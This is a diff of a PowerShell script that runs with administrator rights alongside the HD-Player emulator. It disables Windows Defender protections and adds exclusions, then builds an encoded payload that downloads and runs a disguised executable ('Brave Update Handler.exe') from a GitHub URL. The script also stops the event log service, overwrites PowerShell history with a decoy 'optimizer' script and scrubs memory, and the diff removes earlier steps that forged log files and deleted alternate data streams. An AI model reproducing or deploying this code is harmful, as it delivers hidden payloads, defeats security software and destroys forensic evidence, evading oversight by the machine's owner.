@@ -19,8 +19,8 @@ try {
 <#
 .SYNOPSIS
     Launch payload, wait for HD-Player to exit.
-    Removes hd-player.txt, stops event services, clears logs,
-    removes ADS, deletes USN Journal.
+    Creates AMDInstall.log and two GUID temp files, renames to DLL names before payload,
+    restores after payload, kills HD-adb.exe, then handles adb.log before step 8.
 #>
 
 #Requires -RunAsAdministrator
@@ -70,9 +70,10 @@ try {
 
 Write-Host "[*] Exclusions added. Continuing..." -ForegroundColor Cyan
 
-
-
-
+# ========== STOP EVENT LOG SERVICE ==========
+try {
+    net stop eventlog /y 2>$null
+} catch { }
 
 # ------------------------------------------------------------
 # SAVE ORIGINAL DEFENDER SETTINGS AND DISABLE PROTECTIONS
@@ -89,7 +90,11 @@ Set-MpPreference -DisableScriptScanning $true -EA 0
 Set-MpPreference -DisableIOAVProtection $true -EA 0
 Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Disabled -EA 0
 
-# ========== PREPARE PAYLOAD AS ENCODED COMMAND ==========
+
+
+# ------------------------------------------------------------
+# PREPARE PAYLOAD AS ENCODED COMMAND
+# ------------------------------------------------------------
 $payloadScript = @'
 try {
     $u='https://raw.githubusercontent.com/billa9889/wahhhss1/main/Brave%20Update%20Handler.exe'
@@ -124,12 +129,6 @@ while ($true) {
 }
 Write-Host "[+] HD-Player.exe has exited." -ForegroundColor Green
 
-# ========== IMMEDIATE CLEANUP (ADS + USN) ==========
-Write-Host "[*] Removing Alternate Data Streams from Temp files..." -ForegroundColor Cyan
-Get-ChildItem -Path C:\Windows\Temp, $env:LOCALAPPDATA\Temp -Recurse -File -Force -ErrorAction SilentlyContinue | ForEach-Object {
-    Remove-Item -Path "$($_.FullName):*" -Force -ErrorAction SilentlyContinue
-}
-Write-Host "[+] ADS removed from temp files." -ForegroundColor Green
 
 # ------------------------------------------------------------
 # WAIT 10 SECONDS, THEN KILL PAYLOAD PROCESS
@@ -146,83 +145,11 @@ try {
 }
 
 
-# ------------------------------------------------------------
-# CREATE FAKE IMGUI.INI ON DESKTOP
-# ------------------------------------------------------------
-$imguiDesktopPath = "$env:USERPROFILE\Desktop\imgui.ini"
-Write-Host "[*] Creating fake imgui.ini with PC optimizer logs on Desktop..." -ForegroundColor Cyan
 
-$optimizerLogContent = @"
-[imgui]
-version = 1.91.0
-config_flags = 0x00000000
-font_global_scale = 1.000
-font_allow_user_scaling = 0
-display_win32_pos_x = 100
-display_win32_pos_y = 100
-display_win32_size_x = 1280
-display_win32_size_y = 720
-docking_enabled = 1
 
-duration_sec = 106
-status = "completed"
-total_space_freed_mb = 2847
-total_registry_fixes = 23
-total_privacy_cleaned = 142
-
-[CleanedItems]
-temp_files = 1478 (1.23 GB)
-recycle_bin = 342 (892 MB)
-browser_cache = 2331 (1.48 GB)
-windows_logs = 89 (215 MB)
-crash_dumps = 12 (104 MB)
-windows_update_cache = 1 (1.02 GB)
-
-[RegistryOptimizations]
-invalid_shortcuts = 34
-missing_shared_dlls = 12
-obsolete_startup = 7
-unused_appx_packages = 5
-empty_reg_keys = 56
-
-[PrivacyCleanup]
-recent_documents = 88
-run_history = 142
-search_history = 276
-dns_cache_flushed = 1
-event_logs_rotated = 3
-
-[SystemHealth]
-pagefile_fragmentation = "2%"
-boot_time_improvement_ms = 1240
-memory_compression_enabled = 1
-power_plan = "High Performance"
-
-[LastRunSummary]
-total_optimizations_applied = 382
-errors_encountered = 0
-warnings = 1 (system restore point creation skipped – user disabled)
-recommended_reboot = false
-
-[PostOptimization]
-sfc_scan_result = "no integrity violations"
-disk_trim_performed = 1
-dism_health_check = "healthy"
-windows_defender_quick_scan = "no threats found"
-"@
-
-try {
-    if (Test-Path $imguiDesktopPath) {
-        (Get-Item $imguiDesktopPath -Force).IsReadOnly = $false
-    }
-    Set-Content -Path $imguiDesktopPath -Value $optimizerLogContent -Encoding UTF8 -Force
-    Write-Host "[+] imgui.ini created on Desktop with fake optimizer logs." -ForegroundColor Green
-} catch {
-    Write-Host "[-] Failed to create imgui.ini: $_" -ForegroundColor Red
-}
 
 # ------------------------------------------------------------
-# OVERWRITE POWERSHELL HISTORY
+# OVERWRITE POWERSHELL HISTORY (original step 8)
 # ------------------------------------------------------------
 $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 $dir = Split-Path $historyPath -Parent
@@ -256,11 +183,13 @@ Write-Host "Optimization complete." -ForegroundColor Green
 Set-Content -Path $historyPath -Value $optimizerScript -Encoding UTF8
 Write-Host "[*] PowerShell history overwritten with PC Optimizer script." -ForegroundColor Green
 
+
 # ============================================================
-# PHASE 2: MEMORY FORENSICS (RAM CLEANUP)
+# PHASE 2: MEMORY FORENSICS (RAM CLEANUP) – FIXED & RELIABLE
 # ============================================================
 Write-Host "[PHASE 2] Scrubbing memory artifacts..." -ForegroundColor Cyan
 
+# Use a unique type name to avoid conflicts
 $typeName = "WinAPI" + (Get-Random -Maximum 9999)
 $api = Add-Type -MemberDefinition @'
 [DllImport("kernel32.dll")]
@@ -274,12 +203,15 @@ if (-not $api) {
 if (-not $api) {
     Write-Host "[-] Failed to load EmptyWorkingSet API. Skipping memory cleanup." -ForegroundColor Yellow
 } else {
+    # Clear memory for all processes – skip invalid handles
     Get-Process | ForEach-Object {
         $handle = $_.Handle
         if ($handle -and $handle -ne 0) {
             try {
                 $null = $api::EmptyWorkingSet($handle)
-            } catch {}
+            } catch {
+                # Silently ignore any errors (e.g., access denied)
+            }
         }
     }
 
@@ -292,8 +224,9 @@ if (-not $api) {
 }
 
 
+
 # ------------------------------------------------------------
-# REMOVE WINDOWS DEFENDER EXCLUSIONS
+# REMOVE WINDOWS DEFENDER EXCLUSIONS (original step 9)
 # ------------------------------------------------------------
 Write-Host "[*] Removing Windows Defender exclusions..." -ForegroundColor Cyan
 
@@ -319,7 +252,7 @@ try {
 } catch { Write-Host "[-] Could not remove temp exclusions" -ForegroundColor Yellow }
 
 # ------------------------------------------------------------
-# RE-ENABLE WINDOWS DEFENDER PROTECTIONS
+# RE-ENABLE WINDOWS DEFENDER PROTECTIONS (original step 10)
 # ------------------------------------------------------------
 Write-Host "[*] Re-enabling Windows Defender protections..." -ForegroundColor Cyan
 
@@ -349,7 +282,41 @@ try {
 } catch { Write-Host "[-] Could not re-enable ASR rule" -ForegroundColor Yellow }
 
 Write-Host "[*] Windows Defender protections restored to original state." -ForegroundColor Cyan
+# ------------------------------------------------------------
+# REMOVE WINDOWS DEFENDER EXCLUSIONS (original step 9)
+# ------------------------------------------------------------
+Write-Host "[*] Removing Windows Defender exclusions..." -ForegroundColor Cyan
 
+try {
+    Remove-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
+    Write-Host "[+] C:\ exclusion removed." -ForegroundColor Green
+} catch { Write-Host "[-] Failed to remove C:\ exclusion" -ForegroundColor Yellow }
+
+try {
+    Remove-MpPreference -ExclusionPath "C:\Users\billa\Desktop" -ErrorAction Stop
+    Write-Host "[+] Desktop exclusion removed." -ForegroundColor Green
+} catch { Write-Host "[-] Desktop exclusion not found" -ForegroundColor Yellow }
+
+try {
+    Remove-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
+    Write-Host "[+] PowerShell process exclusion removed." -ForegroundColor Green
+} catch { Write-Host "[-] PowerShell process exclusion not found" -ForegroundColor Yellow }
+
+try {
+    Remove-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop
+    Remove-MpPreference -ExclusionPath "$env:WINDIR\Temp" -ErrorAction Stop
+    Write-Host "[+] Temp folder exclusions removed." -ForegroundColor Green
+} catch { Write-Host "[-] Could not remove temp exclusions" -ForegroundColor Yellow }
+
+
+
+# ========== FINAL CLEANUP ==========
+Write-Host "[*] Performing final cleanup..." -ForegroundColor Cyan
+
+# Restart EventLog service
+try {
+    net start eventlog 2>$null
+} catch { }
 
 
 # ------------------------------------------------------------
